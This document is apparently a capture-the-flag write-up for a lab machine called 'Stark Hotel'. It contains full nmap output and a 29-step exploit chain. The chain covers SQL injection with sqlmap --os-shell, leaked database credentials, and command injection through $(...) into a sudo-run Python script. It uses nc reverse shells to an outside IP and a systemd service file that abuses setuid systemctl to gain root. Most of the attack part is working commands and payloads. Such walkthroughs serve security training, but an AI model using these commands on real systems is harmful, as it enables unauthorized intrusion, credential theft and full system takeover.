```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-24 21:02 IST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
Initiating Ping Scan at 21:02
Scanning 10.10.10.143 [4 ports]
Completed Ping Scan at 21:02, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:02
Completed Parallel DNS resolution of 1 host. at 21:02, 0.15s elapsed
Initiating SYN Stealth Scan at 21:02
Scanning 10.10.10.143 [65535 ports]
Discovered open port 80/tcp on 10.10.10.143
Discovered open port 22/tcp on 10.10.10.143
SYN Stealth Scan Timing: About 4.73% done; ETC: 21:13 (0:10:24 remaining)
SYN Stealth Scan Timing: About 7.24% done; ETC: 21:16 (0:13:01 remaining)
SYN Stealth Scan Timing: About 9.90% done; ETC: 21:17 (0:13:48 remaining)
SYN Stealth Scan Timing: About 12.42% done; ETC: 21:19 (0:14:34 remaining)
SYN Stealth Scan Timing: About 22.45% done; ETC: 21:20 (0:13:42 remaining)
SYN Stealth Scan Timing: About 26.21% done; ETC: 21:19 (0:12:34 remaining)
SYN Stealth Scan Timing: About 27.19% done; ETC: 21:20 (0:13:26 remaining)
SYN Stealth Scan Timing: About 28.43% done; ETC: 21:22 (0:14:24 remaining)
SYN Stealth Scan Timing: About 34.07% done; ETC: 21:22 (0:13:23 remaining)
SYN Stealth Scan Timing: About 38.06% done; ETC: 21:22 (0:12:19 remaining)
SYN Stealth Scan Timing: About 42.58% done; ETC: 21:22 (0:11:17 remaining)
SYN Stealth Scan Timing: About 47.09% done; ETC: 21:21 (0:10:15 remaining)
SYN Stealth Scan Timing: About 51.85% done; ETC: 21:21 (0:09:15 remaining)
SYN Stealth Scan Timing: About 56.56% done; ETC: 21:21 (0:08:16 remaining)
Increasing send delay for 10.10.10.143 from 0 to 5 due to max_successful_tryno increase to 4
SYN Stealth Scan Timing: About 63.13% done; ETC: 21:22 (0:07:19 remaining)
Discovered open port 64999/tcp on 10.10.10.143
SYN Stealth Scan Timing: About 68.18% done; ETC: 21:22 (0:06:18 remaining)
SYN Stealth Scan Timing: About 73.42% done; ETC: 21:22 (0:05:16 remaining)
SYN Stealth Scan Timing: About 78.55% done; ETC: 21:22 (0:04:15 remaining)
SYN Stealth Scan Timing: About 84.21% done; ETC: 21:23 (0:03:15 remaining)
Increasing send delay for 10.10.10.143 from 5 to 10 due to max_successful_tryno increase to 5
SYN Stealth Scan Timing: About 89.84% done; ETC: 21:24 (0:02:13 remaining)
SYN Stealth Scan Timing: About 94.96% done; ETC: 21:24 (0:01:07 remaining)
Completed SYN Stealth Scan at 21:25, 1361.92s elapsed (65535 total ports)
Initiating Service scan at 21:25
Scanning 3 services on 10.10.10.143
Completed Service scan at 21:25, 11.68s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.143
Retrying OS detection (try #2) against 10.10.10.143
Retrying OS detection (try #3) against 10.10.10.143
Retrying OS detection (try #4) against 10.10.10.143
Retrying OS detection (try #5) against 10.10.10.143
Initiating Traceroute at 21:25
Completed Traceroute at 21:25, 0.15s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:25
Completed Parallel DNS resolution of 2 hosts. at 21:25, 0.17s elapsed
NSE: Script scanning 10.10.10.143.
Initiating NSE at 21:25
Completed NSE at 21:25, 18.44s elapsed
Initiating NSE at 21:25
Completed NSE at 21:25, 0.01s elapsed
Nmap scan report for 10.10.10.143
Host is up (0.15s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
5355/tcp  filtered llmnr
64999/tcp open     http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=6/24%OT=22%CT=1%CU=35046%PV=Y%DS=2%DC=T%G=Y%TM=5D10F28
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=8)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 0.029 days (since Mon Jun 24 20:43:48 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   148.51 ms 10.10.12.1
2   148.68 ms 10.10.10.143

NSE: Script Post-scanning.
Initiating NSE at 21:25
Completed NSE at 21:25, 0.00s elapsed
Initiating NSE at 21:25
Completed NSE at 21:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1407.17 seconds
           Raw packets sent: 74260 (3.271MB) | Rcvd: 81548 (5.146MB)

```
```
1- Nmap Scan
2- sqlmap -u 10.10.10.143/room.php?cod=1 --os-shell (SQL Injection)
3- using SQLMap Got username and password for phpmyadmin :
	user: DBadmin
	pass: imissyou
4- https://medium.com/bugbountywriteup/sqlmaps-os-shell-backdooring-website-with-weevely-8cb6dcf17fa4 Refer this article to upload shell using sql map.
5- we will get reverse shell using nc.
6- python -c "import pty; pty.spawn('/bin/bash')"
7- export TERM=screen
8- export SHELL=bash
9- ctrl+z (background current session)
10- stty raw -echo
11- fg
12- fg
13- sudo -l
14- sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
15- "$(cat /home/pepper/user.txt)" (Payload)
16- echo 'nc 10.10.15.224 1589 -e /bin/bash' > /tmp/temp.sh
17- sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
18- $(/bin/bash /tmp/temp.sh) (start nc listener you will get reverse shell as pepper).
19- python -c "import pty; pty.spawn('/bin/bash')"
20- export TERM=screen
21- export SHELL=bash
22- ctrl+z
23- stty raw -echo
24- fg
25- fg
26-
	echo '[Service]
	Type=oneshot
	ExecStart=/bin/sh -c "nc 10.10.15.224 1550 -e /bin/bash"
	[Install]
	WantedBy=multi-user.target' > /home/pepper/temp.service
27- basic enumeration show you that systemctl have setuid set.
28- systemctl link /home/pepper/temp.service (GTFOBins) Always remember you have to give absolute path not the relative path.
29- systemctl enable --now /home/pepper/temp.service
```
